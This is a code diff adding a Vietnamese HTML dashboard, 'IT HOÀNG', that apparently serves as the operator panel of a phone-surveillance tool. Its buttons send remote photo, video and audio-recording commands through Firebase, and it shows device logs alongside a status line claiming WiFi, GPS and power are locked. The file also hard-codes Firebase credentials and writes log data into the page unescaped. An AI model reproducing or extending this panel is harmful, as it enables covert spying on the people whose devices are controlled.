@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DASHBOARD - IT HOÀNG</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #050505; color: white; }
+        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .gradient-text { background: linear-gradient(90deg, #FF1493, #FFD700); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    </style>
+</head>
+<body class="p-4 pb-28">
+    <header class="flex justify-between items-center mb-6">
+        <h1 class="text-2xl font-black gradient-text">IT HOÀNG</h1>
+        <div class="glass px-3 py-1 rounded-full text-[10px] text-green-500 font-bold uppercase animate-pulse">● Online</div>
+    </header>
+
+    <div class="glass rounded-[30px] p-5 mb-6 border-red-500/20">
+        <div class="flex justify-between mb-2">
+            <span class="text-[10px] text-gray-400">🛡️ WIFI/GPS/NGUỒN: <span class="text-red-500">ĐANG KHÓA</span></span>
+            <span id="pin-text" class="text-xs font-bold">--%</span>
+        </div>
+        <div class="w-full bg-gray-800 h-1.5 rounded-full"><div id="pin-bar" class="bg-red-600 h-full" style="width: 0%"></div></div>
+    </div>
+
+    <div class="grid grid-cols-2 gap-4 mb-6">
+        <button onclick="sendCmd('photo')" class="glass h-24 rounded-3xl flex flex-col items-center justify-center active:scale-95 transition-all">
+            <span class="text-2xl">📸</span><span class="text-[10px] font-bold mt-1">CHỤP ẢNH</span>
+        </button>
+        <button onclick="sendCmd('video')" class="glass h-24 rounded-3xl flex flex-col items-center justify-center active:scale-95 border-pink-500/30">
+            <span class="text-2xl">🎥</span><span class="text-[10px] font-bold mt-1 text-pink-500">QUAY VIDEO</span>
+        </button>
+        <button onclick="sendCmd('audio')" class="glass h-24 rounded-3xl flex flex-col items-center justify-center active:scale-95">
+            <span class="text-2xl">🎙️</span><span class="text-[10px] font-bold mt-1">GHI ÂM</span>
+        </button>
+        <button onclick="window.location.href='profile.html'" class="glass h-24 rounded-3xl flex flex-col items-center justify-center active:scale-95">
+            <span class="text-2xl">⏳</span><span class="text-[10px] font-bold mt-1">GIA HẠN</span>
+        </button>
+    </div>
+
+    <div class="glass rounded-[35px] p-6 mb-6">
+        <h3 class="text-yellow-500 font-bold text-xs uppercase mb-4">Nhật ký hệ thống (Tự động)</h3>
+        <div id="log-container" class="space-y-4 max-h-60 overflow-y-auto font-mono text-[10px]">
+            </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-app.js";
+        import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, limit, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.12.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDN9VahdRQfPvBAJDLPhLHMBrEPXZtEOFo",
+            authDomain: "mdm-cloud-a05e2.firebaseapp.com",
+            projectId: "mdm-cloud-a05e2",
+            storageBucket: "mdm-cloud-a05e2.firebasestorage.app",
+            messagingSenderId: "53911904103",
+            appId: "1:53911904103:web:2c7e4c2575369ea9af99c2"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        window.sendCmd = async (type) => {
+            await addDoc(collection(db, "lenh_dieukhien"), { cmd: type, time: serverTimestamp() });
+            alert("Lệnh " + type + " đã gửi!");
+        };
+
+        onSnapshot(query(collection(db, "nhat_ky"), orderBy("thoi_gian", "desc"), limit(20)), (snapshot) => {
+            const container = document.getElementById("log-container");
+            container.innerHTML = "";
+            snapshot.forEach(doc => {
+                const d = doc.data();
+                container.innerHTML += `<div class="border-l-2 border-pink-500 pl-3"><p class="text-blue-400">[${d.loai}]</p><p class="text-gray-300">${d.noi_dung}</p></div>`;
+            });
+        });
+    </script>
+</body>
+</html>
